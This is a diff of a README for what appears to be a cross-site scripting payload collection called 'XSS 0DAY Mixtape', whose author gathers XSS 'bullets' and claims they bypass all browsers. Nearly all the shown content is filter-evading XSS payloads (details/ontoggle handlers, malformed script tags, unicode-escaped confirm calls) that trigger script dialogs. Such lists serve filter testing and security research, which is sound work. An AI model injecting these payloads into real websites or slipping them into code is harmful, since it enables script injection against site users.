@@ -1,7 +1,7 @@
 # XSS 0DAY Mixtape(收集XSS的子弹，有任何建议在微博找我weibo@flagellantX)
+//Bypass All Browser Like Chrome,Firefox,Yandex,all...
 
-
-">'><details/open/ontoggle=confirm('flagellantX')> //Bypass All Browser Like Chrome,Firefox,Yandex,all...
+">'><details/open/ontoggle=confirm('flagellantX')>
 <details open ontoggle=confirm()>
 <script y="><">/*<script* */prompt()</script
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
